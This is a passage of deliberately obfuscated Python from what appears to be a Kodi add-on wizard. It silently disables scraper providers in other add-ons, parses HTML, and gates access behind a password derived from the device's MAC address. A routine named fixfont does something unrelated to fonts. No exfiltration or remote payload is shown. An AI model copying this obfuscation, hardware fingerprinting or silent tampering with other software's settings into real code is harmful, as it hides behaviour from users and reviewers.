	O0O0000OOOOOOO0OO =(ADDON .getSetting ("rdbuild"))#line:1210
	if O0O0000OOOOOOO0OO =='true':#line:1211
		O0OO0OO0000O00O0O =xbmcaddon .Addon ('plugin.video.allmoviesin')#line:1212
		O0OO0OO0000O00O0O .setSetting ('all_t','0')#line:1213
		O0OO0OO0000O00O0O .setSetting ('rd_menu_enable','false')#line:1214
		O0OO0OO0000O00O0O .setSetting ('magnet_bay','false')#line:1215
		O0OO0OO0000O00O0O .setSetting ('magnet_extra','false')#line:1216
		O0OO0OO0000O00O0O .setSetting ('rd_only','false')#line:1217
		O0OO0OO0000O00O0O .setSetting ('ftp','false')#line:1219
		O0OO0OO0000O00O0O .setSetting ('fp','false')#line:1220
		O0OO0OO0000O00O0O .setSetting ('filter_fp','false')#line:1221
		O0OO0OO0000O00O0O .setSetting ('fp_size_en','false')#line:1222
		O0OO0OO0000O00O0O .setSetting ('afdah','false')#line:1223
		O0OO0OO0000O00O0O .setSetting ('ap2s','false')#line:1224
		O0OO0OO0000O00O0O .setSetting ('cin','false')#line:1225
		O0OO0OO0000O00O0O .setSetting ('clv','false')#line:1226
		O0OO0OO0000O00O0O .setSetting ('cmv','false')#line:1227
		O0OO0OO0000O00O0O .setSetting ('dl20','false')#line:1228
		O0OO0OO0000O00O0O .setSetting ('esc','false')#line:1229
		O0OO0OO0000O00O0O .setSetting ('extra','false')#line:1230
		O0OO0OO0000O00O0O .setSetting ('film','false')#line:1231
		O0OO0OO0000O00O0O .setSetting ('fre','false')#line:1232
		O0OO0OO0000O00O0O .setSetting ('fxy','false')#line:1233
		O0OO0OO0000O00O0O .setSetting ('genv','false')#line:1234
		O0OO0OO0000O00O0O .setSetting ('getgo','false')#line:1235
		O0OO0OO0000O00O0O .setSetting ('gold','false')#line:1236
		O0OO0OO0000O00O0O .setSetting ('gona','false')#line:1237
		O0OO0OO0000O00O0O .setSetting ('hdmm','false')#line:1238
		O0OO0OO0000O00O0O .setSetting ('hdt','false')#line:1239
		O0OO0OO0000O00O0O .setSetting ('icy','false')#line:1240
		O0OO0OO0000O00O0O .setSetting ('ind','false')#line:1241
		O0OO0OO0000O00O0O .setSetting ('iwi','false')#line:1242
		O0OO0OO0000O00O0O .setSetting ('jen_free','false')#line:1243
		O0OO0OO0000O00O0O .setSetting ('kiss','false')#line:1244
		O0OO0OO0000O00O0O .setSetting ('lavin','false')#line:1245
		O0OO0OO0000O00O0O .setSetting ('los','false')#line:1246
		O0OO0OO0000O00O0O .setSetting ('m4u','false')#line:1247
		O0OO0OO0000O00O0O .setSetting ('mesh','false')#line:1248
		O0OO0OO0000O00O0O .setSetting ('mf','false')#line:1249
		O0OO0OO0000O00O0O .setSetting ('mkvc','false')#line:1250
		O0OO0OO0000O00O0O .setSetting ('mjy','false')#line:1251
		O0OO0OO0000O00O0O .setSetting ('hdonline','false')#line:1252
		O0OO0OO0000O00O0O .setSetting ('moviex','false')#line:1253
		O0OO0OO0000O00O0O .setSetting ('mpr','false')#line:1254
		O0OO0OO0000O00O0O .setSetting ('mvg','false')#line:1255
		O0OO0OO0000O00O0O .setSetting ('mvl','false')#line:1256
		O0OO0OO0000O00O0O .setSetting ('mvs','false')#line:1257
		O0OO0OO0000O00O0O .setSetting ('myeg','false')#line:1258
		O0OO0OO0000O00O0O .setSetting ('ninja','false')#line:1259
		O0OO0OO0000O00O0O .setSetting ('odb','false')#line:1260
		O0OO0OO0000O00O0O .setSetting ('ophd','false')#line:1261
		O0OO0OO0000O00O0O .setSetting ('pks','false')#line:1262
		O0OO0OO0000O00O0O .setSetting ('prf','false')#line:1263
		O0OO0OO0000O00O0O .setSetting ('put18','false')#line:1264
		O0OO0OO0000O00O0O .setSetting ('req','false')#line:1265
		O0OO0OO0000O00O0O .setSetting ('rftv','false')#line:1266
		O0OO0OO0000O00O0O .setSetting ('rltv','false')#line:1267
		O0OO0OO0000O00O0O .setSetting ('sc','false')#line:1268
		O0OO0OO0000O00O0O .setSetting ('seehd','false')#line:1269
		O0OO0OO0000O00O0O .setSetting ('showbox','false')#line:1270
		O0OO0OO0000O00O0O .setSetting ('shuid','false')#line:1271
		O0OO0OO0000O00O0O .setSetting ('sil_gh','false')#line:1272
		O0OO0OO0000O00O0O .setSetting ('spv','false')#line:1273
		O0OO0OO0000O00O0O .setSetting ('subs','false')#line:1274
		O0OO0OO0000O00O0O .setSetting ('tvs','false')#line:1275
		O0OO0OO0000O00O0O .setSetting ('tw','false')#line:1276
		O0OO0OO0000O00O0O .setSetting ('upto','false')#line:1277
		O0OO0OO0000O00O0O .setSetting ('vel','false')#line:1278
		O0OO0OO0000O00O0O .setSetting ('vex','false')#line:1279
		O0OO0OO0000O00O0O .setSetting ('vidc','false')#line:1280
		O0OO0OO0000O00O0O .setSetting ('w4hd','false')#line:1281
		O0OO0OO0000O00O0O .setSetting ('wav','false')#line:1282
		O0OO0OO0000O00O0O .setSetting ('wf','false')#line:1283
		O0OO0OO0000O00O0O .setSetting ('wse','false')#line:1284
		O0OO0OO0000O00O0O .setSetting ('wss','false')#line:1285
		O0OO0OO0000O00O0O .setSetting ('wsse','false')#line:1286
		O0OO0OO0000O00O0O =xbmcaddon .Addon ('plugin.video.speedmax')#line:1287
		O0OO0OO0000O00O0O .setSetting ('debrid.only','true')#line:1288
		O0OO0OO0000O00O0O .setSetting ('hosts.captcha','false')#line:1289
		O0OO0OO0000O00O0O =xbmcaddon .Addon ('script.module.civitasscrapers')#line:1290
		O0OO0OO0000O00O0O .setSetting ('provider.123moviehd','false')#line:1291
		O0OO0OO0000O00O0O .setSetting ('provider.300mbdownload','false')#line:1292
		O0OO0OO0000O00O0O .setSetting ('provider.alltube','false')#line:1293
		O0OO0OO0000O00O0O .setSetting ('provider.allucde','false')#line:1294
		O0OO0OO0000O00O0O .setSetting ('provider.animebase','false')#line:1295
		O0OO0OO0000O00O0O .setSetting ('provider.animeloads','false')#line:1296
		O0OO0OO0000O00O0O .setSetting ('provider.animetoon','false')#line:1297
		O0OO0OO0000O00O0O .setSetting ('provider.bnwmovies','false')#line:1298
		O0OO0OO0000O00O0O .setSetting ('provider.boxfilm','false')#line:1299
		O0OO0OO0000O00O0O .setSetting ('provider.bs','false')#line:1300
		O0OO0OO0000O00O0O .setSetting ('provider.cartoonhd','false')#line:1301
		O0OO0OO0000O00O0O .setSetting ('provider.cdahd','false')#line:1302
		O0OO0OO0000O00O0O .setSetting ('provider.cdax','false')#line:1303
		O0OO0OO0000O00O0O .setSetting ('provider.cine','false')#line:1304
		O0OO0OO0000O00O0O .setSetting ('provider.cinenator','false')#line:1305
		O0OO0OO0000O00O0O .setSetting ('provider.cmovieshdbz','false')#line:1306
		O0OO0OO0000O00O0O .setSetting ('provider.coolmoviezone','false')#line:1307
		O0OO0OO0000O00O0O .setSetting ('provider.ddl','false')#line:1308
		O0OO0OO0000O00O0O .setSetting ('provider.deepmovie','false')#line:1309
		O0OO0OO0000O00O0O .setSetting ('provider.ekinomaniak','false')#line:1310
		O0OO0OO0000O00O0O .setSetting ('provider.ekinotv','false')#line:1311
		O0OO0OO0000O00O0O .setSetting ('provider.filiser','false')#line:1312
		O0OO0OO0000O00O0O .setSetting ('provider.filmpalast','false')#line:1313
		O0OO0OO0000O00O0O .setSetting ('provider.filmwebbooster','false')#line:1314
		O0OO0OO0000O00O0O .setSetting ('provider.filmxy','false')#line:1315
		O0OO0OO0000O00O0O .setSetting ('provider.fmovies','false')#line:1316
		O0OO0OO0000O00O0O .setSetting ('provider.foxx','false')#line:1317
		O0OO0OO0000O00O0O .setSetting ('provider.freefmovies','false')#line:1318
		O0OO0OO0000O00O0O .setSetting ('provider.freeputlocker','false')#line:1319
		O0OO0OO0000O00O0O .setSetting ('provider.furk','false')#line:1320
		O0OO0OO0000O00O0O .setSetting ('provider.gamatotv','false')#line:1321
		O0OO0OO0000O00O0O .setSetting ('provider.gogoanime','false')#line:1322
		O0OO0OO0000O00O0O .setSetting ('provider.gowatchseries','false')#line:1323
		O0OO0OO0000O00O0O .setSetting ('provider.hackimdb','false')#line:1324
		O0OO0OO0000O00O0O .setSetting ('provider.hdfilme','false')#line:1325
		O0OO0OO0000O00O0O .setSetting ('provider.hdmto','false')#line:1326
		O0OO0OO0000O00O0O .setSetting ('provider.hdpopcorns','false')#line:1327
		O0OO0OO0000O00O0O .setSetting ('provider.hdstreams','false')#line:1328
		O0OO0OO0000O00O0O .setSetting ('provider.horrorkino','false')#line:1330
		O0OO0OO0000O00O0O .setSetting ('provider.iitv','false')#line:1331
		O0OO0OO0000O00O0O .setSetting ('provider.iload','false')#line:1332
		O0OO0OO0000O00O0O .setSetting ('provider.iwaatch','false')#line:1333
		O0OO0OO0000O00O0O .setSetting ('provider.kinodogs','false')#line:1334
		O0OO0OO0000O00O0O .setSetting ('provider.kinoking','false')#line:1335
		O0OO0OO0000O00O0O .setSetting ('provider.kinow','false')#line:1336
		O0OO0OO0000O00O0O .setSetting ('provider.kinox','false')#line:1337
		O0OO0OO0000O00O0O .setSetting ('provider.lichtspielhaus','false')#line:1338
		O0OO0OO0000O00O0O .setSetting ('provider.liomenoi','false')#line:1339
		O0OO0OO0000O00O0O .setSetting ('provider.magnetdl','false')#line:1342
		O0OO0OO0000O00O0O .setSetting ('provider.megapelistv','false')#line:1343
		O0OO0OO0000O00O0O .setSetting ('provider.movie2k-ac','false')#line:1344
		O0OO0OO0000O00O0O .setSetting ('provider.movie2k-ag','false')#line:1345
		O0OO0OO0000O00O0O .setSetting ('provider.movie2z','false')#line:1346
		O0OO0OO0000O00O0O .setSetting ('provider.movie4k','false')#line:1347
		O0OO0OO0000O00O0O .setSetting ('provider.movie4kis','false')#line:1348
		O0OO0OO0000O00O0O .setSetting ('provider.movieneo','false')#line:1349
		O0OO0OO0000O00O0O .setSetting ('provider.moviesever','false')#line:1350
		O0OO0OO0000O00O0O .setSetting ('provider.movietown','false')#line:1351
		O0OO0OO0000O00O0O .setSetting ('provider.mvrls','false')#line:1353
		O0OO0OO0000O00O0O .setSetting ('provider.netzkino','false')#line:1354
		O0OO0OO0000O00O0O .setSetting ('provider.odb','false')#line:1355
		O0OO0OO0000O00O0O .setSetting ('provider.openkatalog','false')#line:1356
		O0OO0OO0000O00O0O .setSetting ('provider.ororo','false')#line:1357
		O0OO0OO0000O00O0O .setSetting ('provider.paczamy','false')#line:1358
		O0OO0OO0000O00O0O .setSetting ('provider.peliculasdk','false')#line:1359
		O0OO0OO0000O00O0O .setSetting ('provider.pelisplustv','false')#line:1360
		O0OO0OO0000O00O0O .setSetting ('provider.pepecine','false')#line:1361
		O0OO0OO0000O00O0O .setSetting ('provider.primewire','false')#line:1362
		O0OO0OO0000O00O0O .setSetting ('provider.projectfreetv','false')#line:1363
		O0OO0OO0000O00O0O .setSetting ('provider.proxer','false')#line:1364
		O0OO0OO0000O00O0O .setSetting ('provider.pureanime','false')#line:1365
		O0OO0OO0000O00O0O .setSetting ('provider.putlocker','false')#line:1366
		O0OO0OO0000O00O0O .setSetting ('provider.putlockerfree','false')#line:1367
		O0OO0OO0000O00O0O .setSetting ('provider.reddit','false')#line:1368
		O0OO0OO0000O00O0O .setSetting ('provider.cartoonwire','false')#line:1369
		O0OO0OO0000O00O0O .setSetting ('provider.seehd','false')#line:1370
		O0OO0OO0000O00O0O .setSetting ('provider.segos','false')#line:1371
		O0OO0OO0000O00O0O .setSetting ('provider.serienstream','false')#line:1372
		O0OO0OO0000O00O0O .setSetting ('provider.series9','false')#line:1373
		O0OO0OO0000O00O0O .setSetting ('provider.seriesever','false')#line:1374
		O0OO0OO0000O00O0O .setSetting ('provider.seriesonline','false')#line:1375
		O0OO0OO0000O00O0O .setSetting ('provider.seriespapaya','false')#line:1376
		O0OO0OO0000O00O0O .setSetting ('provider.sezonlukdizi','false')#line:1377
		O0OO0OO0000O00O0O .setSetting ('provider.solarmovie','false')#line:1378
		O0OO0OO0000O00O0O .setSetting ('provider.solarmoviez','false')#line:1379
		O0OO0OO0000O00O0O .setSetting ('provider.stream-to','false')#line:1380
		O0OO0OO0000O00O0O .setSetting ('provider.streamdream','false')#line:1381
		O0OO0OO0000O00O0O .setSetting ('provider.streamflix','false')#line:1382
		O0OO0OO0000O00O0O .setSetting ('provider.streamit','false')#line:1383
		O0OO0OO0000O00O0O .setSetting ('provider.swatchseries','false')#line:1384
		O0OO0OO0000O00O0O .setSetting ('provider.szukajkatv','false')#line:1385
		O0OO0OO0000O00O0O .setSetting ('provider.tainiesonline','false')#line:1386
		O0OO0OO0000O00O0O .setSetting ('provider.tainiomania','false')#line:1387
		O0OO0OO0000O00O0O .setSetting ('provider.tata','false')#line:1390
		O0OO0OO0000O00O0O .setSetting ('provider.trt','false')#line:1391
		O0OO0OO0000O00O0O .setSetting ('provider.tvbox','false')#line:1392
		O0OO0OO0000O00O0O .setSetting ('provider.ultrahd','false')#line:1393
		O0OO0OO0000O00O0O .setSetting ('provider.video4k','false')#line:1394
		O0OO0OO0000O00O0O .setSetting ('provider.vidics','false')#line:1395
		O0OO0OO0000O00O0O .setSetting ('provider.view4u','false')#line:1396
		O0OO0OO0000O00O0O .setSetting ('provider.watchseries','false')#line:1397
		O0OO0OO0000O00O0O .setSetting ('provider.xrysoi','false')#line:1398
		O0OO0OO0000O00O0O .setSetting ('provider.library','false')#line:1399
def fixfont ():#line:1402
	O0O0O00O0O000O00O =xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.GetSettings","id":1}')#line:1403
	OOOOO0OOO00000OOO =json .loads (O0O0O00O0O000O00O );#line:1405
	O000O0OOOOOOOO0O0 =OOOOO0OOO00000OOO ["result"]["settings"]#line:1406
	OO000O000O00OO000 =[OOOO0000O000O00O0 for OOOO0000O000O00O0 in O000O0OOOOOOOO0O0 if OOOO0000O000O00O0 ["id"]=="audiooutput.audiodevice"][0 ]#line:1408
	OO0O0O0000O0O0O00 =OO000O000O00OO000 ["options"];#line:1409
	OOO00O0O00OO0O000 =OO000O000O00OO000 ["value"];#line:1410
	O0OOO0O0O0OOOOO0O =[O0OO0OOO000O00O00 for (O0OO0OOO000O00O00 ,O000OO0000OOOO000 )in enumerate (OO0O0O0000O0O0O00 )if O000OO0000OOOO000 ["value"]==OOO00O0O00OO0O000 ][0 ];#line:1412
	OO000O000O0O00000 =(O0OOO0O0O0OOOOO0O +1 )%len (OO0O0O0000O0O0O00 )#line:1414
	OO0O0OOO000O0O0O0 =OO0O0O0000O0O0O00 [OO000O000O0O00000 ]["value"]#line:1416
	O0O00O000O0OO0000 =OO0O0O0000O0O0O00 [OO000O000O0O00000 ]["label"]#line:1417
	O0OOO0OOOO0O0O000 =xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","params":{"setting":"subtitles.height","value":40},"id":1}')#line:1419
	try :#line:1421
		O0000OO000O00OO00 =json .loads (O0OOO0OOOO0O0O000 );#line:1422
		if O0000OO000O00OO00 ["result"]!=True :#line:1424
			raise Exception #line:1425
	except :#line:1426
		sys .stderr .write ("Error switching audio output device")#line:1427
		raise Exception #line:1428
def parseDOM2 (O0O0O0O00OO00O00O ,name =u"",attrs ={},ret =False ):#line:1429
	if isinstance (O0O0O0O00OO00O00O ,str ):#line:1432
		try :#line:1433
			O0O0O0O00OO00O00O =[O0O0O0O00OO00O00O .decode ("utf-8")]#line:1434
		except :#line:1435
			O0O0O0O00OO00O00O =[O0O0O0O00OO00O00O ]#line:1436
	elif isinstance (O0O0O0O00OO00O00O ,unicode ):#line:1437
		O0O0O0O00OO00O00O =[O0O0O0O00OO00O00O ]#line:1438
	elif not isinstance (O0O0O0O00OO00O00O ,list ):#line:1439
		return u""#line:1440
	if not name .strip ():#line:1442
		return u""#line:1443
	O000O0O0O00O000OO =[]#line:1445
	for OOO0OOO0000OOOO0O in O0O0O0O00OO00O00O :#line:1446
		O00O00OOOOO000000 =re .compile ('(<[^>]*?\n[^>]*?>)').findall (OOO0OOO0000OOOO0O )#line:1447
		for OOOO0O000OOOO0OOO in O00O00OOOOO000000 :#line:1448
			OOO0OOO0000OOOO0O =OOO0OOO0000OOOO0O .replace (OOOO0O000OOOO0OOO ,OOOO0O000OOOO0OOO .replace ("\n"," "))#line:1449
		O0OOO0OOO0O0OO0OO =[]#line:1451
		for OOO0000OOOOO0O000 in attrs :#line:1452
			O0OOO0000O0O0O0OO =re .compile ('(<'+name +'[^>]*?(?:'+OOO0000OOOOO0O000 +'=[\'"]'+attrs [OOO0000OOOOO0O000 ]+'[\'"].*?>))',re .M |re .S ).findall (OOO0OOO0000OOOO0O )#line:1453
			if len (O0OOO0000O0O0O0OO )==0 and attrs [OOO0000OOOOO0O000 ].find (" ")==-1 :#line:1454
				O0OOO0000O0O0O0OO =re .compile ('(<'+name +'[^>]*?(?:'+OOO0000OOOOO0O000 +'='+attrs [OOO0000OOOOO0O000 ]+'.*?>))',re .M |re .S ).findall (OOO0OOO0000OOOO0O )#line:1455
			if len (O0OOO0OOO0O0OO0OO )==0 :#line:1457
				O0OOO0OOO0O0OO0OO =O0OOO0000O0O0O0OO #line:1458
				O0OOO0000O0O0O0OO =[]#line:1459
			else :#line:1460
				O0000O0O000O00O0O =range (len (O0OOO0OOO0O0OO0OO ))#line:1461
				O0000O0O000O00O0O .reverse ()#line:1462
				for OOO00O0000O00O000 in O0000O0O000O00O0O :#line:1463
					if not O0OOO0OOO0O0OO0OO [OOO00O0000O00O000 ]in O0OOO0000O0O0O0OO :#line:1464
						del (O0OOO0OOO0O0OO0OO [OOO00O0000O00O000 ])#line:1465
		if len (O0OOO0OOO0O0OO0OO )==0 and attrs =={}:#line:1467
			O0OOO0OOO0O0OO0OO =re .compile ('(<'+name +'>)',re .M |re .S ).findall (OOO0OOO0000OOOO0O )#line:1468
			if len (O0OOO0OOO0O0OO0OO )==0 :#line:1469
				O0OOO0OOO0O0OO0OO =re .compile ('(<'+name +' .*?>)',re .M |re .S ).findall (OOO0OOO0000OOOO0O )#line:1470
		if isinstance (ret ,str ):#line:1472
			O0OOO0000O0O0O0OO =[]#line:1473
			for OOOO0O000OOOO0OOO in O0OOO0OOO0O0OO0OO :#line:1474
				OOO0000OOOO000OOO =re .compile ('<'+name +'.*?'+ret +'=([\'"].[^>]*?[\'"])>',re .M |re .S ).findall (OOOO0O000OOOO0OOO )#line:1475
				if len (OOO0000OOOO000OOO )==0 :#line:1476
					OOO0000OOOO000OOO =re .compile ('<'+name +'.*?'+ret +'=(.[^>]*?)>',re .M |re .S ).findall (OOOO0O000OOOO0OOO )#line:1477
				for OOO00O0000O0O000O in OOO0000OOOO000OOO :#line:1478
					O0O000O0O0OO0O0O0 =OOO00O0000O0O000O [0 ]#line:1479
					if O0O000O0O0OO0O0O0 in "'\"":#line:1480
						if OOO00O0000O0O000O .find ('='+O0O000O0O0OO0O0O0 ,OOO00O0000O0O000O .find (O0O000O0O0OO0O0O0 ,1 ))>-1 :#line:1481
							OOO00O0000O0O000O =OOO00O0000O0O000O [:OOO00O0000O0O000O .find ('='+O0O000O0O0OO0O0O0 ,OOO00O0000O0O000O .find (O0O000O0O0OO0O0O0 ,1 ))]#line:1482
						if OOO00O0000O0O000O .rfind (O0O000O0O0OO0O0O0 ,1 )>-1 :#line:1484
							OOO00O0000O0O000O =OOO00O0000O0O000O [1 :OOO00O0000O0O000O .rfind (O0O000O0O0OO0O0O0 )]#line:1485
					else :#line:1486
						if OOO00O0000O0O000O .find (" ")>0 :#line:1487
							OOO00O0000O0O000O =OOO00O0000O0O000O [:OOO00O0000O0O000O .find (" ")]#line:1488
						elif OOO00O0000O0O000O .find ("/")>0 :#line:1489
							OOO00O0000O0O000O =OOO00O0000O0O000O [:OOO00O0000O0O000O .find ("/")]#line:1490
						elif OOO00O0000O0O000O .find (">")>0 :#line:1491
							OOO00O0000O0O000O =OOO00O0000O0O000O [:OOO00O0000O0O000O .find (">")]#line:1492
					O0OOO0000O0O0O0OO .append (OOO00O0000O0O000O .strip ())#line:1494
			O0OOO0OOO0O0OO0OO =O0OOO0000O0O0O0OO #line:1495
		else :#line:1496
			O0OOO0000O0O0O0OO =[]#line:1497
			for OOOO0O000OOOO0OOO in O0OOO0OOO0O0OO0OO :#line:1498
				O0OOO00O0O00O0O00 =u"</"+name #line:1499
				O00OO00OO00OO0O00 =OOO0OOO0000OOOO0O .find (OOOO0O000OOOO0OOO )#line:1501
				OO00OOOO0OO0OOO00 =OOO0OOO0000OOOO0O .find (O0OOO00O0O00O0O00 ,O00OO00OO00OO0O00 )#line:1502
				OOOOO00OO000OO000 =OOO0OOO0000OOOO0O .find ("<"+name ,O00OO00OO00OO0O00 +1 )#line:1503
				while OOOOO00OO000OO000 <OO00OOOO0OO0OOO00 and OOOOO00OO000OO000 !=-1 :#line:1505
					O0O00000O0O0O0OO0 =OOO0OOO0000OOOO0O .find (O0OOO00O0O00O0O00 ,OO00OOOO0OO0OOO00 +len (O0OOO00O0O00O0O00 ))#line:1506
					if O0O00000O0O0O0OO0 !=-1 :#line:1507
						OO00OOOO0OO0OOO00 =O0O00000O0O0O0OO0 #line:1508
					OOOOO00OO000OO000 =OOO0OOO0000OOOO0O .find ("<"+name ,OOOOO00OO000OO000 +1 )#line:1509
				if O00OO00OO00OO0O00 ==-1 and OO00OOOO0OO0OOO00 ==-1 :#line:1511
					O00OOOOO0OOOO000O =u""#line:1512
				elif O00OO00OO00OO0O00 >-1 and OO00OOOO0OO0OOO00 >-1 :#line:1513
					O00OOOOO0OOOO000O =OOO0OOO0000OOOO0O [O00OO00OO00OO0O00 +len (OOOO0O000OOOO0OOO ):OO00OOOO0OO0OOO00 ]#line:1514
				elif OO00OOOO0OO0OOO00 >-1 :#line:1515
					O00OOOOO0OOOO000O =OOO0OOO0000OOOO0O [:OO00OOOO0OO0OOO00 ]#line:1516
				elif O00OO00OO00OO0O00 >-1 :#line:1517
					O00OOOOO0OOOO000O =OOO0OOO0000OOOO0O [O00OO00OO00OO0O00 +len (OOOO0O000OOOO0OOO ):]#line:1518
				if ret :#line:1520
					O0OOO00O0O00O0O00 =OOO0OOO0000OOOO0O [OO00OOOO0OO0OOO00 :OOO0OOO0000OOOO0O .find (">",OOO0OOO0000OOOO0O .find (O0OOO00O0O00O0O00 ))+1 ]#line:1521
					O00OOOOO0OOOO000O =OOOO0O000OOOO0OOO +O00OOOOO0OOOO000O +O0OOO00O0O00O0O00 #line:1522
				OOO0OOO0000OOOO0O =OOO0OOO0000OOOO0O [OOO0OOO0000OOOO0O .find (O00OOOOO0OOOO000O ,OOO0OOO0000OOOO0O .find (OOOO0O000OOOO0OOO ))+len (O00OOOOO0OOOO000O ):]#line:1524
				O0OOO0000O0O0O0OO .append (O00OOOOO0OOOO000O )#line:1525
			O0OOO0OOO0O0OO0OO =O0OOO0000O0O0O0OO #line:1526
		O000O0O0O00O000OO +=O0OOO0OOO0O0OO0OO #line:1527
	return O000O0O0O00O000OO #line:1529
def addItem (OOOO00OO0OOOO0OO0 ,O0OOO0OO0O0OO0OO0 ,OOO000OO00O00O000 ,OO0OOOOO0OO00000O ,O0OOOOO0OO00O000O ,description =None ):#line:1531
	if description ==None :description =''#line:1532
	description ='[COLOR white]'+description +'[/COLOR]'#line:1533
	O000O0O00O0O000O0 =sys .argv [0 ]+"?url="+urllib .quote_plus (O0OOO0OO0O0OO0OO0 )+"&mode="+str (OOO000OO00O00O000 )+"&name="+urllib .quote_plus (OOOO00OO0OOOO0OO0 )+"&iconimage="+urllib .quote_plus (OO0OOOOO0OO00000O )+"&fanart="+urllib .quote_plus (O0OOOOO0OO00O000O )#line:1534
	OOOO000OO0000O00O =True #line:1535
	OO000OOOOO0OOOOOO =xbmcgui .ListItem (OOOO00OO0OOOO0OO0 ,iconImage =OO0OOOOO0OO00000O ,thumbnailImage =OO0OOOOO0OO00000O )#line:1536
	OO000OOOOO0OOOOOO .setInfo (type ="Video",infoLabels ={"Title":OOOO00OO0OOOO0OO0 ,"Plot":description })#line:1537
	OO000OOOOO0OOOOOO .setProperty ("fanart_Image",O0OOOOO0OO00O000O )#line:1538
	OO000OOOOO0OOOOOO .setProperty ("icon_Image",OO0OOOOO0OO00000O )#line:1539
	OOOO000OO0000O00O =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =O000O0O00O0O000O0 ,listitem =OO000OOOOO0OOOOOO ,isFolder =False )#line:1540
	return OOOO000OO0000O00O #line:1541
def get_params ():#line:1543
		OO0OO000OO0O00O00 =[]#line:1544
		O000O0O0OOO0000O0 =sys .argv [2 ]#line:1545
		if len (O000O0O0OOO0000O0 )>=2 :#line:1546
				OOOO0O0OO000O0O0O =sys .argv [2 ]#line:1547
				OOO0O00O00O00O0OO =OOOO0O0OO000O0O0O .replace ('?','')#line:1548
				if (OOOO0O0OO000O0O0O [len (OOOO0O0OO000O0O0O )-1 ]=='/'):#line:1549
						OOOO0O0OO000O0O0O =OOOO0O0OO000O0O0O [0 :len (OOOO0O0OO000O0O0O )-2 ]#line:1550
				OO0OO0000O00OOO00 =OOO0O00O00O00O0OO .split ('&')#line:1551
				OO0OO000OO0O00O00 ={}#line:1552
				for OOOO0O0O0O00000OO in range (len (OO0OO0000O00OOO00 )):#line:1553
						O0O00000000OOO0OO ={}#line:1554
						O0O00000000OOO0OO =OO0OO0000O00OOO00 [OOOO0O0O0O00000OO ].split ('=')#line:1555
						if (len (O0O00000000OOO0OO ))==2 :#line:1556
								OO0OO000OO0O00O00 [O0O00000000OOO0OO [0 ]]=O0O00000000OOO0OO [1 ]#line:1557
		return OO0OO000OO0O00O00 #line:1559
def decode (O00OO00OO00OOO0O0 ,OO00OOOO00O0O0OO0 ):#line:1564
    import base64 #line:1565
    O000OO00OOO0OOO00 =[]#line:1566
    if (len (O00OO00OO00OOO0O0 ))!=4 :#line:1568
     return 10 #line:1569
    OO00OOOO00O0O0OO0 =base64 .urlsafe_b64decode (OO00OOOO00O0O0OO0 )#line:1570
    for O0O0OOOOO00OO0000 in range (len (OO00OOOO00O0O0OO0 )):#line:1572
        O0OO00000OO0O00OO =O00OO00OO00OOO0O0 [O0O0OOOOO00OO0000 %len (O00OO00OO00OOO0O0 )]#line:1573
        OOO0O0000O0OO000O =chr ((256 +ord (OO00OOOO00O0O0OO0 [O0O0OOOOO00OO0000 ])-ord (O0OO00000OO0O00OO ))%256 )#line:1574
        O000OO00OOO0OOO00 .append (OOO0O0000O0OO000O )#line:1575
    return "".join (O000OO00OOO0OOO00 )#line:1576
def tmdb_list (O0OOO00O000O0OO00 ):#line:1577
    OO0O00O00O0O00O0O =decode ("7643",O0OOO00O000O0OO00 )#line:1580
    return int (OO0O00O00O0O00O0O )#line:1583
def u_list (OO0O00O000000OOOO ):#line:1584
    from math import sqrt #line:1586
    O00000OO000OOOO0O =tmdb_list (TMDB_NEW_API )#line:1587
    OOOOO000O0OOOOO0O =str ((getHwAddr ('eth0'))*O00000OO000OOOO0O )#line:1589
    O000OO00OOO0OO0O0 =int (OOOOO000O0OOOOO0O [1 ]+OOOOO000O0OOOOO0O [2 ]+OOOOO000O0OOOOO0O [5 ]+OOOOO000O0OOOOO0O [7 ])#line:1590
    O0O00OO0OOO000000 =(ADDON .getSetting ("pass"))#line:1592
    O000OOO0OO0000OOO =(str (round (sqrt ((O000OO00OOO0OO0O0 *700 )+50 )+50 ,4 ))[-4 :]).replace ('.','')#line:1597
    if '.'in O000OOO0OO0000OOO :#line:1598
     O000OOO0OO0000OOO =(str (round (sqrt ((O000OO00OOO0OO0O0 *700 )+50 )+50 ,4 ))[-5 :]).replace ('.','')#line:1599
    if O0O00OO0OOO000000 ==O000OOO0OO0000OOO :#line:1601
      OOOO0OOO00OOOOO0O =OO0O00O000000OOOO #line:1603
    else :#line:1605
       if STARTP2 ()and STARTP ()=='ok':#line:1606
         return OO0O00O000000OOOO #line:1609
       OOOO0OOO00OOOOO0O ='https://www.google.com/search?&q=don%27t+take+my+money&oq=dont+take+my+moniey'#line:1610
       xbmcgui .Dialog ().ok ('הקוד שלך',' סיסמה שגויה')#line:1611
       sys .exit ()#line:1612
    return OOOO0OOO00OOOOO0O #line:1613
def disply_hwr ():#line:1616
   try :#line:1617
    OOOO00OO0O0O0OO00 =tmdb_list (TMDB_NEW_API )#line:1618
    OOO0OOO0O0OO0OOO0 =str ((getHwAddr ('eth0'))*OOOO00OO0O0O0OO00 )#line:1619
    OO00OOOOOOOO00O0O =(OOO0OOO0O0OO0OOO0 [1 ]+OOO0OOO0O0OO0OOO0 [2 ]+OOO0OOO0O0OO0OOO0 [5 ]+OOO0OOO0O0OO0OOO0 [7 ])#line:1626
    OOO0OO00O0O0000O0 =(ADDON .getSetting ("action"))#line:1627
    wiz .setS ('action',str (OO00OOOOOOOO00O0O ))#line:1629
   except :pass #line:1630
def disply_hwr2 ():#line:1631
   try :#line:1632
    OO0OOOOO0OO00OOOO =tmdb_list (TMDB_NEW_API )#line:1633
    OO00000O0O000000O =str ((getHwAddr ('eth0'))*OO0OOOOO0OO00OOOO )#line:1635
    OOO0OOO000000O0OO =(OO00000O0O000000O [1 ]+OO00000O0O000000O [2 ]+OO00000O0O000000O [5 ]+OO00000O0O000000O [7 ])#line:1644
    O00000000OO0000OO =(ADDON .getSetting ("action"))#line:1645
    xbmcgui .Dialog ().ok ("[COLOR yellow] לשלוח את הקוד למנהלים [/COLOR]",OOO0OOO000000O0OO )#line:1648
   except :pass #line:1649
def getHwAddr (OOO0O000O0OO00OO0 ):#line:1651
   import subprocess ,time #line:1652
   OO0OO0OOOOO0OOOO0 ='windows'#line:1653
   if xbmc .getCondVisibility ('system.platform.android'):#line:1654
       OO0OO0OOOOO0OOOO0 ='android'#line:1655
   if xbmc .getCondVisibility ('system.platform.android'):#line:1656
